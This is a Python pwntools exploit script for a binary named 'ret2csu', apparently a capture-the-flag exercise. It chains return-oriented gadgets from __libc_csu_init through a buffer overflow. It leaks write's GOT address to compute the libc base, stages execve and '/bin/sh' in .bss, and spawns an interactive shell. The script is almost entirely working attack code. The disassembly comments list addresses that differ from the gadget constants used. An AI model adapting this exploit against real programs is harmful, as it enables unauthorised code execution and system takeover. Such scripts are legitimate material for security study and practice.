    from pwn import *

    p = process("./ret2csu")

    elf = ELF('./ret2csu')
    libc = elf.libc
    bssAddr = elf.bss()
    mainAddr = elf.symbols['main']

    gadMovToReg = 0x400600
    #   4011d0:       4c 89 f2                mov    %r14,%rdx
    #   4011d3:       4c 89 ee                mov    %r13,%rsi
    #   4011d6:       44 89 e7                mov    %r12d,%edi
    #   4011d9:       41 ff 14 df             callq  *(%r15,%rbx,8)
    gadPopToReg = 0x40061a
    #   4011ea:       5b                      pop    %rbx
    #   4011eb:       5d                      pop    %rbp
    #   4011ec:       41 5c                   pop    %r12
    #   4011ee:       41 5d                   pop    %r13
    #   4011f0:       41 5e                   pop    %r14
    #   4011f2:       41 5f                   pop    %r15
    #   4011f4:       c3                      retq   
    stackBalanceOffset = 56

    writeGotAddr = elf.got['write']
    readGotAddr = elf.got['read']

    def genPayload( arg1, funcAddr, rbx = 0, rbp = 1, arg2 = 0, ret = mainAddr, arg3 = 0):
        """
        use the two gadgets to launch a call
        
        Arguments:
            arg1 {b} -- 1st parameter for call, rdi(edi), i.e. r12(d)
            funcAddr {b} -- function addres, i.e. r15
        
        Keyword Arguments:
            rbx {b} -- may not be used here (default: {0})
            rbp {b} -- may not be used here (default: {1})
            arg2 {b} -- 2nd parameter for call, rsi, i.e. r13 (default: {0})
            arg3 {b} -- 3rd parameter for call, rdx, i.e. r14 (default: {0})
            ret {b} -- return address after payload execution
        """
        
        payload = b'A' * 136 + p64(gadPopToReg) + p64(rbx) + p64(rbp) + p64(arg1) + p64(arg2) + p64(arg3) + p64(funcAddr)
        payload += p64(gadMovToReg) + b'A' * 56 +p64(ret)
        return payload

    p.recvuntil("Hello, World\n")

    # Get the address of write in libc and then, libc
    # write prototype: write(int fd, const void * buf, size_t count)
    payload1 = genPayload(1, writeGotAddr, arg2 = writeGotAddr, arg3 = 8)
    f1 = open("./payload1", "wb")
    f1.write(payload1)
    f1.close()
    p.send(payload1)
    sleep(1)

    writeAddrInLibc = u64(p.recv(8))
    print("[*] Write Addr in libc:", hex(writeAddrInLibc))

    libc.address = writeAddrInLibc - libc.symbols['write']
    print("[*] libc Addr:", libc.address)

    # systemAddr = libc.symbols['system']
    systemAddr = libc.symbols['execve']
    print("[*] system Addr:", systemAddr)

    p.recvuntil("Hello, World\n")

    # Read addr(system()) and "/bin/sh" to bss seg
    # read prototype: read(int fd, void *buf, size_t count)
    # read(0, bssAddr, 16)
    payload2 = genPayload(0, readGotAddr, arg2 = bssAddr, arg3 = 16)
    p.send(payload2)
    print("[*] Sent Payload2")
    sleep(1)

    p.send(p64(systemAddr))
    p.send("/bin/sh\0")
    sleep(1)

    p.recvuntil("Hello, World\n")


    # execute system("/bin/sh")
    payload3 = genPayload(bssAddr+8, bssAddr)
    p.send(payload3)
    print("[*] Sent Payload3")
    sleep(1)
    p.interactive()